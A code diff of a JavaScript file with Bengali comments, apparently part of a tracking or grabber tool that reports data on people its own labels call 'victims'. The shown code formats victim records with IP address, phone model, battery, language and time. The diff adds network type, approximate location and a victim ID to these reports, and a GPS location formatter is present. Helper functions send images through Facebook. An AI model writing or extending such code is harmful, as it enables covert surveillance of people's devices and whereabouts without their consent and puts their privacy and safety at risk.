@@ -78,11 +78,9 @@ async function saveImageFile(base64Image) {
     const imagesDir = path.join(__dirname, '../public/images');
     await fs.ensureDir(imagesDir);
 
-    // Base64 ডাটা থেকে এক্সট্র্যাক্ট
     let base64Data = base64Image;
     let ext = 'jpg';
 
-    // যদি data:image/jpeg;base64, ফরম্যাটে আসে
     const matches = base64Image.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
     if (matches && matches.length === 3) {
       ext = matches[1] === 'jpeg' ? 'jpg' : matches[1];
@@ -142,25 +140,20 @@ async function sendImageMessage(recipientId, imageUrl) {
 }
 
 // ================================================================
-// Base64 ইমেজ সেভ করে URL দিয়ে পাঠানো (আপডেটেড)
+// Base64 ইমেজ সেভ করে URL দিয়ে পাঠানো
 // ================================================================
 async function sendImageMessageBase64(recipientId, base64Image) {
   try {
-    // ১. ইমেজ ফাইল সেভ করি
     const filename = await saveImageFile(base64Image);
     if (!filename) {
       console.error('❌ ইমেজ সেভ করতে ব্যর্থ');
       return { success: false, error: 'IMAGE_SAVE_FAILED' };
     }
 
-    // ২. কনফিগ থেকে বেস URL নিই
     const config = await getConfig();
     const baseUrl = config.baseUrl || 'http://localhost:3000';
-
-    // ৩. পাবলিক URL তৈরি করি
     const imageUrl = `${baseUrl}/images/${filename}`;
 
-    // ৪. sendImageMessage দিয়ে Facebook-এ পাঠাই
     return await sendImageMessage(recipientId, imageUrl);
   } catch (err) {
     console.error('❌ sendImageMessageBase64 error:', err.message);
@@ -243,19 +236,20 @@ function getBangladeshTime() {
 }
 
 // ================================================================
-// ভিক্টিম ডেটা ফরম্যাট (IP ও লোকেশন N/A থাকলে লাইন বাদ)
+// ভিক্টিম ডেটা ফরম্যাট (ভিক্টিম আইডি সহ)
 // ================================================================
 function formatVictimData(victim) {
   const d = victim.device || {};
   const deviceTime = getBangladeshTime();
   let msg = '✅ *ভিক্টিমের তথ্য পাওয়া গেছে!*\n\n';
   
-  // IP শুধু থাকলেই দেখান
+  // IP
   if (victim.ip && victim.ip !== '0.0.0.0' && victim.ip !== 'N/A') {
     msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip}\n`;
   }
   msg += `🕐 *সময়:* ${deviceTime}\n\n`;
 
+  // ডিভাইস
   const model = getDeviceModel(d);
   msg += `📱 *ফোনের মডেল:* ${model}\n`;
   
@@ -264,15 +258,39 @@ function formatVictimData(victim) {
   msg += `👆 *টাচ পয়েন্ট:* ${d.maxTouchPoints || 0}\n`;
   msg += `🗣️ *ভাষা:* ${d.language || 'N/A'}\n\n`;
 
+  // ব্যাটারি
   const b = victim.battery || {};
   msg += `🔋 *চার্জ:* ${b.level || 'N/A'}%\n`;
-  msg += `⚡ *চার্জিং:* ${b.charging ? 'হ্যাঁ ✅' : 'না ❌'}\n`;
+  msg += `⚡ *চার্জিং:* ${b.charging ? 'হ্যাঁ ✅' : 'না ❌'}\n\n`;
+
+  // নেটওয়ার্ক
+  const network = victim.network || {};
+  if (network.type && network.type !== 'N/A') {
+    msg += `📶 *নেটওয়ার্ক:* ${network.type}\n`;
+  }
+
+  // লোকেশন
+  const loc = victim.location || {};
+  if (loc.city && loc.country) {
+    msg += `📍 *আনুমানিক অবস্থান:* ${loc.city}, ${loc.country}\n`;
+  } else if (loc.city) {
+    msg += `📍 *আনুমানিক অবস্থান:* ${loc.city}\n`;
+  } else if (loc.country) {
+    msg += `📍 *আনুমানিক অবস্থান:* ${loc.country}\n`;
+  }
+
+  // ================================================================
+  // 🆔 ভিক্টিম আইডি (আবার যোগ করা হলো)
+  // ================================================================
+  if (victim.id) {
+    msg += `\n🆔 *ভিক্টিম আইডি:* ${victim.id}`;
+  }
 
   return msg;
 }
 
 // ================================================================
-// লোকেশন মেসেজ ফরম্যাট করা (GPS লোকেশন)
+// লোকেশন মেসেজ ফরম্যাট (GPS)
 // ================================================================
 function formatLocationMessage(gpsLocation) {
   if (!gpsLocation || !gpsLocation.latitude) {
